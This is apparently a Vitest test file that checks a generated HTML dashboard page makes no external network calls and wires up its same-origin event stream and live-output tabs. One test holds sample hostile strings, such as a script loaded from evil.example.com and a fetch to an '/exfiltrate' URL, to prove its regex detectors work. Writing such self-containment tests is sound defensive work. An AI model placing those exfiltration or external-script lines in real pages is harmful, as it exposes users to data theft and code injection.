import { expect, test } from 'vitest'
import { buildPage } from './page.js'

test('the page is a complete, self-contained HTML document', () => {
  const html = buildPage()
  expect(html).toMatch(/^<!doctype html>/i)
  expect(html).toContain('<style>')
  expect(html).toContain('<script>')
  expect(html).toContain('</html>')
})

test('nothing in the page reaches out to an external host', () => {
  const html = buildPage()
  // A bare http(s):// substring scan is too broad: it also flags legitimate,
  // never-fetched strings like the SVG XML namespace URI passed to
  // createElementNS. Instead, scope the check to the actual ways a page can
  // reach out to a network host: link/script tags, and fetch/XHR/WebSocket/
  // EventSource calls that target an http(s):// URL (same-origin calls like
  // fetch('/model') or new EventSource('/events') are fine).
  expect(html).not.toMatch(/<link\b/i)          // no external stylesheet/font
  expect(html).not.toMatch(/<script\s+src=/i)   // no external script (only inline <script>)
  expect(html).not.toMatch(/fetch\(\s*['"]https?:/i)
  expect(html).not.toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
  expect(html).not.toMatch(/cdn\./i)
})

test('the self-containment check still catches a real external-URL violation', () => {
  const maliciousSnippet = '<script src="https://evil.example.com/x.js"></script>'
  expect(maliciousSnippet).toMatch(/<script\s+src=/i)

  const maliciousFetch = `fetch('https://evil.example.com/exfiltrate')`
  expect(maliciousFetch).toMatch(/fetch\(\s*['"]https?:/i)

  const maliciousEventSource = `new EventSource('https://evil.example.com/events')`
  expect(maliciousEventSource).toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
})

test('the inline client wires EventSource(\'/events\') and fetch(\'/model\')', () => {
  const html = buildPage()
  expect(html).toContain(`new EventSource('/events')`)
  expect(html).toContain(`fetch('/model')`)
})

test('the page renders an empty-state message container for a run with no events yet', () => {
  const html = buildPage()
  expect(html).toContain('id="empty-state"')
})

test('the page defines a live-output section, hidden by default, with a tab strip and output body', () => {
  const html = buildPage()
  expect(html).toContain('id="live-output-section"')
  expect(html).toContain('id="live-tabs"')
  expect(html).toContain('id="live-output-body"')
})

test('the inline client renders live output tabs from the running nodes on every re-render', () => {
  const html = buildPage()
  expect(html).toContain('function renderLiveOutput(model)')
  expect(html).toContain('renderLiveOutput(model)') // called from render(model), not just defined
})

test('the default tab is the first running node, and clicking a tab is wired via addEventListener', () => {
  const html = buildPage()
  expect(html).toContain('selectedTab = running[0].id')
  expect(html).toContain('addEventListener')
})
